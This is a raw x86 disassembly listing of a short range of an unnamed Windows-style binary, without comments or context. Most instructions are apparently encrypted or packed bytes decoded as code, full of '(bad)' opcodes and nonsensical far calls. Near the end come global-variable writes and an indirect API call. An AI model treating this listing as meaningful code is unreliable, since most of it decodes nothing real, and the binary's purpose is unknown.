  40fb72:	mov    ebp,0x53f50d15
  40fb77:	inc    ebx
  40fb78:	imul   eax,ecx,0xfce77d
  40fb7e:	bound  edi,QWORD PTR [ecx+edi*8]
  40fb81:	dec    esi
  40fb82:	cmp    DWORD PTR [ecx],ebp
  40fb84:	push   cs
  40fb85:	add    BYTE PTR [ebx+0x6def9085],bh
  40fb8b:	add    BYTE PTR [ebp+0x52cfb42b],ah
  40fb91:	ins    BYTE PTR es:[edi],dx
  40fb92:	leave  
  40fb93:	push   esi
  40fb94:	retf   0x408d
  40fb97:	bound  ebx,QWORD PTR [eax]
  40fb99:	xor    al,0xa0
  40fb9b:	aas    
  40fb9c:	fisttp WORD PTR [ecx]
  40fb9e:	and    BYTE PTR [esi-0x1a],cl
  40fba1:	pop    DWORD PTR [ebx+esi*4]
  40fba4:	jp     0x40fb94
  40fba6:	add    al,0xa9
  40fba8:	adc    eax,0x9bb0a0c7
  40fbad:	xor    ch,al
  40fbaf:	xor    ecx,DWORD PTR [eax-0x7663d259]
  40fbb5:	(bad)  
  40fbb6:	out    0x9a,al
  40fbb8:	fsubr  st(0),st
  40fbba:	test   BYTE PTR [esp+ebp*8],ah
  40fbbd:	pop    ss
  40fbbe:	cmp    BYTE PTR [bp+di+0x6d01],dl
  40fbc3:	dec    edi
  40fbc4:	(bad)  
  40fbc6:	sti    
  40fbc7:	ins    DWORD PTR es:[edi],dx
  40fbc8:	ins    BYTE PTR es:[edi],dx
  40fbc9:	or     al,0x6
  40fbcb:	or     BYTE PTR [edi+0x3b51e59b],bl
  40fbd1:	stos   DWORD PTR es:[edi],eax
  40fbd2:	jae    0x40fbb0
  40fbd4:	icebp  
  40fbd5:	mov    al,ds:0xc02fc6e3
  40fbda:	xchg   edi,eax
  40fbdb:	and    DWORD PTR [ecx+0x50ad7793],eax
  40fbe1:	add    BYTE PTR [eax],cl
  40fbe3:	mov    ebx,DWORD PTR [eax+0x25]
  40fbe6:	jns    0x40fc4d
  40fbe8:	fwait
  40fbe9:	(bad)  
  40fbea:	mov    esi,0xf2e2461
  40fbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbf0:	add    cl,dl
  40fbf2:	fcomp  DWORD PTR [ebx-0x3e]
  40fbf5:	cmp    BYTE PTR [esi],cl
  40fbf7:	push   0xc32092e8
  40fbfc:	or     eax,ebp
  40fbfe:	(bad)  
  40fbff:	icebp  
  40fc00:	pop    esp
  40fc01:	out    0xfe,al
  40fc03:	push   ecx
  40fc04:	adc    DWORD PTR [esi+eax*1+0x38],ebx
  40fc08:	jno    0x40fbf3
  40fc0a:	shl    BYTE PTR [edi-0x1],cl
  40fc0d:	int3   
  40fc0e:	test   eax,0xf2ddfca
  40fc13:	imul   edi,DWORD PTR [ebp+0x813668d],0x62
  40fc1a:	shl    dl,0x32
  40fc1d:	test   eax,0x74d8f4c8
  40fc22:	push   eax
  40fc23:	fsubr  QWORD PTR [edx]
  40fc25:	mov    ds,WORD PTR [eax]
  40fc27:	clc    
  40fc28:	mov    WORD PTR [ebp-0x62],cs
  40fc2b:	cmp    DWORD PTR [edi+0x38ff675e],edi
  40fc31:	xchg   ebp,eax
  40fc32:	mov    ah,0x0
  40fc34:	aas    
  40fc35:	inc    ebp
  40fc36:	xlat   BYTE PTR ds:[ebx]
  40fc37:	sub    ebp,eax
  40fc39:	adc    al,0x51
  40fc3b:	(bad)  
  40fc3c:	push   eax
  40fc3d:	xchg   esi,eax
  40fc3e:	arpl   WORD PTR [edi],ax
  40fc40:	test   eax,0xa42175f1
  40fc45:	out    0x7,eax
  40fc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc48:	inc    ebp
  40fc49:	xor    DWORD PTR [esi-0x5c],0x21df1eb8
  40fc50:	sub    BYTE PTR [ebx],0x4b
  40fc53:	inc    edi
  40fc54:	inc    edi
  40fc55:	stos   BYTE PTR es:[edi],al
  40fc56:	repz pop ss
  40fc58:	inc    edx
  40fc59:	jo     0x40fc47
  40fc5b:	inc    eax
  40fc5c:	jb     0x40fc1a
  40fc5e:	jge    0x40fbfb
  40fc60:	mov    bh,0xfa
  40fc62:	cmc    
  40fc63:	inc    eax
  40fc64:	push   ebp
  40fc65:	cmp    BYTE PTR [eax+ebx*8],0xc0
  40fc69:	dec    esp
  40fc6a:	xlat   BYTE PTR ds:[ebx]
  40fc6b:	xchg   esp,eax
  40fc6c:	stos   DWORD PTR es:[edi],eax
  40fc6d:	test   BYTE PTR [ecx],dl
  40fc6f:	mov    ds:0xaea16b6,al
  40fc74:	call   0x5e64:0x1ea56211
  40fc7b:	mov    edx,0x524e5be6
  40fc80:	fistp  QWORD PTR [edx]
  40fc82:	rcr    DWORD PTR [edi],0x63
  40fc85:	hlt    
  40fc86:	mov    BYTE PTR [esi+eax*8-0x173b1363],bl
  40fc8d:	inc    di
  40fc8f:	cwde   
  40fc90:	pop    ebp
  40fc91:	in     eax,0xfe
  40fc93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc94:	stos   BYTE PTR es:[edi],al
  40fc95:	mov    al,0x7b
  40fc97:	aas    
  40fc98:	jo     0x40fc56
  40fc9a:	pop    esp
  40fc9b:	mov    bl,0x5c
  40fc9d:	jb     0x40fc86
  40fc9f:	push   0x3ddf9f4e
  40fca4:	or     cl,dh
  40fca6:	inc    esp
  40fca7:	adc    DWORD PTR [eax-0x7cdcbb8f],edi
  40fcad:	dec    DWORD PTR [eax-0xe64d17c]
  40fcb3:	adc    dh,BYTE PTR [esi]
  40fcb5:	xchg   edi,eax
  40fcb6:	rol    DWORD PTR [eax+eax*1+0x696a2f92],0xb5
  40fcbe:	xchg   ecx,eax
  40fcbf:	jno    0x40fc67
  40fcc1:	xor    DWORD PTR [eax+edi*4-0x6e],ebx
  40fcc5:	ja     0x40fc57
  40fcc7:	lods   eax,DWORD PTR ds:[esi]
  40fcc8:	push   ebx
  40fcc9:	scas   al,BYTE PTR es:[edi]
  40fcca:	sub    BYTE PTR [ebp-0x1],0x87
  40fcce:	add    esi,ecx
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	rol    DWORD PTR [esi-0x46e40b16],0xb3
  40fce9:	jle    0x40fd69
  40fceb:	lods   al,BYTE PTR ds:[esi]
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fca5
  40fcf0:	sbb    al,0x74
  40fcf2:	jle    0x40fd6a
  40fcf4:	loope  0x40fc93
  40fcf6:	fild   QWORD PTR es:[edx-0x45]
  40fcfa:	leave  
  40fcfb:	pop    eax
  40fcfc:	adc    ecx,esi
  40fcfe:	ja     0x40fcee
  40fd00:	add    al,0x39
  40fd02:	test   eax,0x134a60b5
  40fd07:	jecxz  0x40fd15
  40fd09:	or     dh,BYTE PTR [ebx+0x26900f20]
  40fd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd10:	iret   
  40fd11:	xor    al,0x71
  40fd13:	loopne 0x40fcfa
  40fd15:	(bad)  
  40fd16:	fdivp  st(2),st
  40fd18:	jns    0x40fd77
  40fd1a:	push   edi
  40fd1b:	sbb    DWORD PTR [esi+0x42],edi
  40fd1e:	cmp    ebx,DWORD PTR [esi+0x12dac543]
  40fd24:	push   esp
  40fd25:	leave  
  40fd26:	sub    al,0x33
  40fd28:	sub    bh,BYTE PTR [ebx]
  40fd2a:	repnz gs pop esi
  40fd2d:	scas   al,BYTE PTR es:[edi]
  40fd2e:	ror    esp,0x4f
  40fd31:	mov    dh,0x81
  40fd33:	push   cs
  40fd34:	add    al,0x93
  40fd36:	loop   0x40fd7e
  40fd38:	rcl    dh,1
  40fd3a:	push   ebp
  40fd3b:	add    al,0xf8
  40fd3d:	arpl   WORD PTR [eax],di
  40fd3f:	dec    ecx
  40fd40:	shr    cx,cl
  40fd43:	mov    edi,0xd9a53bb8
  40fd48:	cdq    
  40fd49:	mov    ah,0xd9
  40fd4b:	and    DWORD PTR [edx+0x42],0x55a6e676
  40fd52:	xor    eax,0xcd32ff0e
  40fd57:	test   eax,0xbe318119
  40fd5c:	jae    0x40fd99
  40fd5e:	retf   
  40fd5f:	mov    cl,bh
  40fd61:	mov    edx,0x7af824a8
  40fd66:	ret    
  40fd67:	aaa    
  40fd68:	push   ss
  40fd69:	xor    ecx,DWORD PTR [ecx]
  40fd6b:	xchg   edx,eax
  40fd6c:	aam    0x8b
  40fd6e:	xor    eax,0x1a7d7135
  40fd73:	ins    BYTE PTR es:[edi],dx
  40fd74:	bound  ebp,QWORD PTR [ebx+0x53968bee]
  40fd7a:	int3   
  40fd7b:	call   0xe7a7ee69
  40fd80:	call   0xff1e:0x5f9541fa
  40fd87:	xlat   BYTE PTR es:[ebx]
  40fd89:	imul   ebp,DWORD PTR [ebx-0x2e3f9218],0xed9197df
  40fd93:	xchg   ecx,eax
  40fd94:	ficom  WORD PTR [esi]
  40fd96:	(bad)  
  40fd97:	fwait
  40fd98:	cmp    DWORD PTR [edx+eiz*1],edx
  40fd9b:	imul   ebp,DWORD PTR [eax],0x5b787047
  40fda1:	adc    al,0x99
  40fda3:	xchg   esi,eax
  40fda4:	and    ecx,DWORD PTR [ebp-0x54e5de9b]
  40fdaa:	in     al,dx
  40fdab:	sub    al,0xd8
  40fdad:	adc    eax,0x39251d0a
  40fdb2:	mov    WORD PTR [ebx+0x4a],ds
  40fdb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdb6:	adc    eax,0x2d00ff8a
  40fdbb:	cs out 0xe5,eax
  40fdbe:	aas    
  40fdbf:	sub    eax,0x9e1d4162
  40fdc4:	(bad)  
  40fdc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdc6:	retf   
  40fdc7:	fisttp WORD PTR [eax]
  40fdc9:	mov    eax,0xe567c1c4
  40fdce:	inc    ebx
  40fdcf:	sub    DWORD PTR [ebp-0x71],0x3a
  40fdd3:	mov    edx,0xc3422588
  40fdd8:	mov    ecx,0x7050f97f
  40fddd:	pop    ds
  40fdde:	dec    edi
  40fddf:	xlat   BYTE PTR ds:[ebx]
  40fde0:	clc    
  40fde1:	mov    eax,0x9a006284
  40fde6:	add    dl,dl
  40fde8:	jle    0x40fdbc
  40fdea:	ret    
  40fdeb:	shr    BYTE PTR [ecx+0x9],cl
  40fdee:	call   0xe548:0x54832a43
  40fdf5:	mov    ah,0x36
  40fdf7:	(bad)  
  40fdf8:	hlt    
  40fdf9:	pop    esi
  40fdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdfb:	pop    es
  40fdfc:	scas   eax,DWORD PTR es:[edi]
  40fdfd:	push   edx
  40fdfe:	in     eax,dx
  40fdff:	sub    eax,0xba0b4b53
  40fe04:	lahf   
  40fe05:	loope  0x40fdb5
  40fe07:	pop    es
  40fe08:	adc    eax,0xf4cfd1e3
  40fe0d:	mov    ebp,0x34564389
  40fe12:	xor    BYTE PTR [edx],al
  40fe14:	add    cl,BYTE PTR [ecx-0xd]
  40fe17:	push   cs
  40fe18:	das    
  40fe19:	or     BYTE PTR [ecx+0x7a],bl
  40fe1c:	push   cs
  40fe1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe1e:	and    al,0x3f
  40fe20:	test   al,0xb8
  40fe22:	cwde   
  40fe23:	mov    ebx,0x62d11f7d
  40fe28:	(bad)  
  40fe29:	pusha  
  40fe2a:	call   0x1c2d:0x6e013052
  40fe31:	nop
  40fe32:	xchg   edi,eax
  40fe33:	aam    0x6c
  40fe35:	cs push esp
  40fe37:	lods   al,BYTE PTR ds:[esi]
  40fe38:	inc    ebp
  40fe39:	cmp    edx,edx
  40fe3b:	xor    ch,BYTE PTR ds:0x39b274cc
  40fe41:	push   0xffffffcc
  40fe43:	or     al,0xf
  40fe45:	bound  eax,QWORD PTR gs:[eax-0x72fd33fd]
  40fe4c:	jp     0x40fe07
  40fe4e:	out    dx,eax
  40fe4f:	cld    
  40fe50:	mov    esi,0x9e0a1928
  40fe55:	lods   al,BYTE PTR ds:[esi]
  40fe56:	xlat   BYTE PTR ds:[ebx]
  40fe57:	out    0x3,eax
  40fe59:	bound  ebx,QWORD PTR [esp+ebx*4]
  40fe5c:	scas   eax,DWORD PTR es:[edi]
  40fe5d:	mov    edi,0x92053d21
  40fe62:	in     al,dx
  40fe63:	adc    al,0x16
  40fe65:	pop    ebx
  40fe66:	cmp    cl,BYTE PTR [edi+0x633201a5]
  40fe6c:	and    BYTE PTR [ecx-0x5a12a77e],dh
  40fe72:	add    BYTE PTR [eax+0x6b],bl
  40fe75:	mov    edx,0xdd94aa91
  40fe7a:	jecxz  0x40fe49
  40fe7c:	and    al,0x26
  40fe7e:	mov    dh,ah
  40fe80:	adc    DWORD PTR [ebx+eiz*4+0x135ce196],esp
  40fe87:	push   ss
  40fe88:	and    bl,BYTE PTR [ecx]
  40fe8a:	scas   al,BYTE PTR es:[edi]
  40fe8b:	and    DWORD PTR [esi],eax
  40fe8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe8e:	loop   0x40fe21
  40fe90:	addr16 out 0x23,al
  40fe93:	jb     0x40fe1b
  40fe95:	sub    ebp,esi
  40fe97:	jbe    0x40fedf
  40fe99:	fst    DWORD PTR cs:[edi-0x7d]
  40fe9d:	fmul   st,st(2)
  40fe9f:	jns    0x40fecf
  40fea1:	mov    al,ds:0x6b327dbd
  40fea6:	mov    eax,0xd20125ae
  40feab:	push   ebx
  40feac:	jno    0x40fea5
  40feae:	lea    ebp,[edx+0x533be9a3]
  40feb4:	xor    dh,dh
  40feb6:	icebp  
  40feb7:	and    eax,0xc0092717
  40febc:	cmp    DWORD PTR [esi],0x3cd4d917
  40fec2:	ins    DWORD PTR es:[edi],dx
  40fec3:	(bad)  
  40fec4:	sbb    BYTE PTR [esi+ecx*2-0x51318890],ch
  40fecb:	inc    edx
  40fecc:	xchg   esi,eax
  40fecd:	sub    BYTE PTR [eax+ebx*1],dl
  40fed0:	mov    ds:0xc274ca9d,ax
  40fed6:	repz push es
  40fed8:	jmp    0x76c89444
  40fedd:	jno    0x40fe6f
  40fedf:	jl     0x40fedc
  40fee1:	mov    dl,0x9
  40fee3:	and    al,0xd
  40fee5:	stos   DWORD PTR es:[edi],eax
  40fee6:	nop
  40fee7:	xchg   ebx,eax
  40fee8:	mov    bh,0x6d
  40feea:	dec    ebx
  40feeb:	aad    0x59
  40feed:	test   BYTE PTR [edi-0x2ff060],bh
  40fef3:	mov    bl,0x64
  40fef5:	pusha  
  40fef6:	sbb    DWORD PTR [ecx],ebx
  40fef8:	es and ebp,edx
  40fefb:	jbe    0x40feba
  40fefd:	jae    0x40fefc
  40feff:	test   eax,0x80d401d4
  40ff04:	and    bl,ch
  40ff06:	pop    esp
  40ff07:	ja     0x40fe9e
  40ff09:	fild   QWORD PTR [ebx+esi*8]
  40ff0c:	adc    BYTE PTR [ebx-0x220657a6],bl
  40ff12:	cmp    ebp,edi
  40ff14:	out    dx,al
  40ff15:	push   ecx
  40ff16:	inc    esp
  40ff17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff18:	imul   edi,DWORD PTR ds:0x26d11a02,0x7a711831
  40ff22:	mov    dh,BYTE PTR [ebx+0x56fcf8bb]
  40ff28:	xlat   BYTE PTR ds:[ebx]
  40ff29:	mov    bh,BYTE PTR [ecx-0x5e2aeda8]
  40ff2f:	xchg   edx,eax
  40ff30:	xor    DWORD PTR [eax+0x753bf3c0],ecx
  40ff36:	add    esi,DWORD PTR [eax]
  40ff38:	inc    edx
  40ff39:	imul   esp
  40ff3b:	leave  
  40ff3c:	mov    bl,0x7f
  40ff3e:	hlt    
  40ff3f:	inc    esi
  40ff40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff41:	or     DWORD PTR [eax],ecx
  40ff43:	fdivp  st(5),st
  40ff45:	mov    esp,0x22d731fd
  40ff4a:	clc    
  40ff4b:	cld    
  40ff4c:	mov    DWORD PTR [edx],eax
  40ff4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff4f:	int    0x3a
  40ff51:	std    
  40ff52:	ja     0x40ff3e
  40ff54:	clc    
  40ff55:	cs aaa 
  40ff57:	sub    BYTE PTR [edi+0x1b],0x61
  40ff5b:	sbb    DWORD PTR [ebx-0x5eec8ac3],ecx
  40ff61:	jle    0x40ff00
  40ff63:	stc    
  40ff64:	shr    BYTE PTR [esi],0xe7
  40ff67:	mov    eax,0x79554434
  40ff6c:	push   0xcb17ab21
  40ff71:	stos   BYTE PTR es:[edi],al
  40ff72:	mov    ebp,0x7e0c49a6
  40ff77:	fcmovnbe st,st(0)
  40ff79:	aam    0x44
  40ff7b:	std    
  40ff7c:	pop    edi
  40ff7d:	pop    es
  40ff7e:	jo     0x40ff75
  40ff80:	jge    0x40ffa1
  40ff82:	mov    ah,0x9b
  40ff84:	sahf   
  40ff85:	xor    ch,BYTE PTR [ebx+0x55]
  40ff88:	jmp    FWORD PTR [ecx]
  40ff8a:	outs   dx,BYTE PTR ds:[esi]
  40ff8b:	mov    bh,0x62
  40ff8d:	fisub  DWORD PTR [edx+eiz*2-0x7]
  40ff91:	sbb    bh,BYTE PTR [ebx-0x79]
  40ff94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff95:	repnz mov ds:0xa446da65,al
  40ff9b:	xchg   esi,eax
  40ff9c:	jne    0x40ff78
  40ff9e:	xchg   ebp,eax
  40ff9f:	cld    
  40ffa0:	int3   
  40ffa1:	imul   eax,esi
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xab2a39b1
  40ffd9:	xor    DWORD PTR [ebp-0x9],0xac7e7ebe
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x40ff6d
  40ffe4:	jmp    0x69c0:0xb7afd2f1
  40ffeb:	fld    TBYTE PTR [edx+0x12]
  40ffee:	fwait
  40ffef:	or     eax,0xa25a87b8
  40fff4:	out    dx,al
  40fff5:	pushf  
  40fff6:	repnz xlat BYTE PTR ds:[ebx]
  40fff8:	pop    eax
  40fff9:	and    edx,DWORD PTR [ebx-0x553023b8]
  40ffff:	adc    BYTE PTR [esi-0x76],ch
  410002:	addr16 add al,0xb8
  410005:	mov    ebp,0x3d43ba37
  41000a:	add    DWORD PTR [esi-0x1f81290f],esi
  410010:	nop
  410011:	test   edi,edi
  410013:	push   ds
  410014:	cmp    esi,ecx
  410016:	shl    cl,0x34
  410019:	add    DWORD PTR [edi-0x5],ebx
  41001c:	outs   dx,BYTE PTR ds:[esi]
  41001d:	push   ss
  41001e:	(bad)  
  41001f:	mov    ah,0xd6
  410021:	sub    edx,ecx
  410023:	and    BYTE PTR [ecx-0x48],ch
  410026:	inc    ebp
  410027:	outs   dx,DWORD PTR ds:[esi]
  410028:	nop
  410029:	jb     0x410043
  41002b:	daa    
  41002c:	fisubr WORD PTR [esi]
  41002e:	cmp    eax,0x2dfc1df9
  410033:	call   0x78b0:0xacc80a7b
  41003a:	jmp    0xebf39918
  41003f:	imul   esi,DWORD PTR [esi],0x71c8ddba
  410045:	cmp    al,0x31
  410047:	xchg   esp,eax
  410048:	jecxz  0x40fff4
  41004a:	fwait
  41004b:	sub    BYTE PTR [ebx],cl
  41004d:	cdq    
  41004e:	or     DWORD PTR [eax],ebp
  410050:	sbb    BYTE PTR [esi+0x6e],ah
  410053:	rcl    BYTE PTR [edi+0x364b990c],cl
  410059:	xor    al,0xce
  41005b:	mov    WORD PTR [esi-0x7c],?
  41005e:	jo     0x410015
  410060:	mov    ebp,0x9d8d6011
  410065:	lds    ecx,FWORD PTR [edi+0x2668c3a]
  41006b:	or     BYTE PTR [ebp+0x5b],0x50
  41006f:	ins    DWORD PTR es:[edi],dx
  410070:	mov    ebx,0xbef22ccd
  410075:	inc    esp
  410076:	bound  edi,QWORD PTR [edx]
  410078:	es (bad) 
  41007a:	fld    DWORD PTR [ecx*4+0x2955365]
  410081:	mov    dh,0xe5
  410083:	inc    edi
  410084:	loop   0x41006e
  410086:	xchg   edx,eax
  410087:	(bad)  
  410088:	jmp    0x41008e
  41008a:	jmp    0x4100db
  41008c:	jl     0x4100a6
  41008e:	out    0xa1,al
  410090:	and    al,BYTE PTR [ebx]
  410092:	pusha  
  410093:	mov    ch,0x17
  410095:	sti    
  410096:	push   ebx
  410097:	inc    edx
  410098:	push   ds
  410099:	in     eax,0xf9
  41009b:	shl    bl,0xe7
  41009e:	clc    
  41009f:	push   0x4ed6b599
  4100a4:	dec    ecx
  4100a5:	neg    DWORD PTR [eax+0x29]
  4100a8:	aaa    
  4100a9:	cli    
  4100aa:	pop    ebp
  4100ab:	cwde   
  4100ac:	fwait
  4100ad:	adc    DWORD PTR [ebx+eiz*2],ecx
  4100b0:	pop    ebx
  4100b1:	ror    DWORD PTR [ebx],0x2a
  4100b4:	dec    ebx
  4100b5:	or     ch,ch
  4100b7:	sbb    ecx,DWORD PTR [edi+0x29]
  4100ba:	cwde   
  4100bb:	pop    edx
  4100bc:	retf   
  4100bd:	sub    cl,BYTE PTR [ebp-0x47df191d]
  4100c3:	hlt    
  4100c4:	add    eax,0x9d52e486
  4100c9:	or     dl,BYTE PTR [edx+0x57]
  4100cc:	jmp    0x410134
  4100ce:	adc    DWORD PTR [edx+0x6b],0x964a9f5d
  4100d5:	test   BYTE PTR [eax+0x23],cl
  4100d8:	push   eax
  4100d9:	jmp    0x41010e
  4100db:	frstor [edx+0x61]
  4100de:	sbb    al,0xd1
  4100e0:	js     0x4100b9
  4100e2:	jle    0x4100e2
  4100e4:	push   ebp
  4100e5:	xchg   DWORD PTR [ebx],eax
  4100e7:	cs aad 0xe5
  4100ea:	mov    eax,0x16d4d2a2
  4100ef:	mov    dl,0xc7
  4100f1:	mov    cl,cl
  4100f3:	push   ebp
  4100f4:	test   BYTE PTR gs:[ebx],dl
  4100f7:	pop    esp
  4100f8:	cmp    al,BYTE PTR [ecx]
  4100fa:	hlt    
  4100fb:	cmp    BYTE PTR [ecx],dl
  4100fd:	ret    
  4100fe:	pop    eax
  4100ff:	pop    edx
  410100:	aas    
  410101:	(bad)  
  410102:	mov    bl,0x1a
  410104:	enter  0x46a7,0x8e
  410108:	or     BYTE PTR [esi],dh
  41010a:	leave  
  41010b:	push   ebp
  41010c:	jecxz  0x4100b7
  41010e:	jo     0x4100db
  410110:	push   es
  410111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410112:	je     0x41018c
  410114:	pop    edx
  410115:	mov    ds:0xd3303685,al
  41011a:	outs   dx,BYTE PTR ds:[esi]
  41011b:	adc    edx,ebp
  41011d:	fisttp QWORD PTR [edi-0xb]
  410120:	loope  0x4100a6
  410122:	call   DWORD PTR ds:0xd10b4cdf
  410128:	stc    
  410129:	sub    dl,BYTE PTR [ecx-0x80]
  41012c:	pand   mm3,mm2
  41012f:	sbb    DWORD PTR [ebp-0x2d78dfdd],ebp
  410135:	mov    eax,ds:0x377e55ba
  41013a:	and    al,0xce
  41013c:	inc    eax
  41013d:	mov    BYTE PTR ds:0x2363d26e,bh
  410143:	stos   DWORD PTR es:[edi],eax
  410144:	inc    ecx
  410145:	and    DWORD PTR ds:0x5752f252,esp
  41014b:	test   edi,edi
  41014d:	shl    esp,0x5b
  410150:	out    dx,al
  410151:	pavgb  mm3,QWORD PTR [ebp+0x4e210f75]
  410158:	loopne 0x410134
  41015a:	xchg   edi,eax
  41015b:	popf   
  41015c:	mov    dl,0xe4
  41015e:	adc    BYTE PTR [ebp+ecx*8+0x54],0x96
  410163:	fwait
  410164:	pop    es
  410165:	ins    BYTE PTR es:[edi],dx
  410166:	shr    BYTE PTR [ebp+0x76e65674],1
  41016c:	leave  
  41016d:	push   ebx
  41016e:	inc    ebx
  41016f:	popa   
  410170:	mov    ecx,0x4118ed3c
  410175:	sar    DWORD PTR [edx],cl
  410177:	loop   0x4101c6
  410179:	rcr    DWORD PTR ds:0x5088fc5b,1
  41017f:	add    edx,DWORD PTR [eax+eiz*1-0x1b]
  410183:	mov    ecx,0x2d604f15
  410188:	sbb    edx,DWORD PTR [ebx-0x77541f93]
  41018e:	mov    cl,0x7b
  410190:	push   esi
  410191:	jae    0x4101c9
  410193:	mov    ch,BYTE PTR [edx]
  410195:	popa   
  410196:	jp     0x4101c2
  410198:	inc    eax
  410199:	repz sti 
  41019b:	sub    ah,BYTE PTR [edi]
  41019d:	push   ebx
  41019e:	test   al,0x8a
  4101a0:	xchg   eax,edi
  4101a2:	dec    ebx
  4101a3:	pop    ebp
  4101a4:	js     0x410175
  4101a6:	mov    al,0x87
  4101a8:	(bad)  [esi+0x694d227e]
  4101ae:	repz or ah,BYTE PTR [ebx-0x63e91af2]
  4101b5:	jecxz  0x4101e7
  4101b7:	sbb    DWORD PTR [esi],0x2d
  4101ba:	es pop esi
  4101bc:	jecxz  0x410238
  4101be:	xchg   edx,eax
  4101bf:	fwait
  4101c0:	cmp    cl,BYTE PTR [eax+ecx*1]
  4101c3:	dec    edi
  4101c4:	icebp  
  4101c5:	inc    ebp
  4101c6:	arpl   WORD PTR [eax+ebx*8+0x74],sp
  4101ca:	test   al,ah
  4101cc:	lea    edx,[ebx+0x2f7f1f1c]
  4101d2:	jg     0x410157
  4101d4:	xchg   BYTE PTR [edx],cl
  4101d6:	mov    BYTE PTR [ebp+0x4e],bh
  4101d9:	mov    esi,0x7015127b
  4101de:	mov    dl,0xda
  4101e0:	iret   
  4101e1:	int    0xb3
  4101e3:	inc    ebp
  4101e4:	hlt    
  4101e5:	out    dx,eax
  4101e6:	pop    ds
  4101e7:	iret   
  4101e8:	ret    
  4101e9:	stc    
  4101ea:	add    al,0x2a
  4101ec:	jae    0x4101cb
  4101ee:	lahf   
  4101ef:	xor    eax,DWORD PTR [ecx]
  4101f1:	jbe    0x41020c
  4101f3:	add    DWORD PTR ds:[esi],edi
  4101f6:	push   ebp
  4101f7:	mov    ah,0x26
  4101f9:	jbe    0x4101c7
  4101fb:	scas   eax,DWORD PTR es:[edi]
  4101fc:	sahf   
  4101fd:	pop    edi
  4101fe:	sub    ebx,ebx
  410200:	pop    ss
  410201:	and    edx,DWORD PTR [esi+esi*8+0x40]
  410205:	sbb    BYTE PTR [ebx],al
  410207:	shr    DWORD PTR [edx-0x8e99823],0x70
  41020e:	loope  0x410258
  410210:	idiv   BYTE PTR [edi]
  410212:	dec    esi
  410213:	sbb    ch,cl
  410215:	popa   
  410216:	fild   DWORD PTR ds:0xdae9029b
  41021c:	sbb    cl,bl
  41021e:	imul   edx,DWORD PTR [ebx+eiz*4+0x46],0x24
  410223:	mov    esi,0xee5782e8
  410228:	aam    0x93
  41022a:	lods   eax,DWORD PTR ds:[esi]
  41022b:	fs shr ch,0x94
  41022f:	mov    dl,0x5a
  410231:	in     al,dx
  410232:	repz pop ebp
  410235:	push   es
  410236:	add    al,0x78
  410238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410239:	xlat   BYTE PTR ds:[ebx]
  41023a:	push   cs
  41023b:	push   ecx
  41023c:	iret   
  41023d:	xor    esp,DWORD PTR [esi-0x2a]
  410240:	dec    ecx
  410241:	and    al,bl
  410243:	cwde   
  410244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410245:	adc    bl,bl
  410247:	sbb    DWORD PTR [edi],0x5f6be2e1
  41024d:	(bad)  
  41024e:	aas    
  41024f:	mov    al,ds:0x50cd3cb5
  410254:	call   0xfb0a359a
  410259:	add    al,0x5
  41025b:	push   es
  41025c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41025d:	adc    ch,BYTE PTR [ecx+0x27d1032]
  410263:	mov    ah,0xe5
  410265:	fld    QWORD PTR [esp+esi*4]
  410268:	je     0x410278
  41026a:	hlt    
  41026b:	(bad)  
  41026c:	rcl    DWORD PTR [eax+ebp*4+0x70],1
  410270:	fbstp  TBYTE PTR [eax-0x1c87d72b]
  410276:	jne    0x4102b7
  410278:	mov    bh,0xe4
  41027a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41027b:	arpl   WORD PTR [esi-0x44],di
  41027e:	push   ss
  41027f:	jmp    0xbbaa:0xce5bc449
  410286:	pop    ds
  410287:	mov    ah,0xed
  410289:	ret    0x837e
  41028c:	pop    ecx
  41028d:	test   ebx,edx
  41028f:	or     esp,ebx
  410291:	mov    ds:0x8b583c13,al
  410296:	jne    0x410290
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
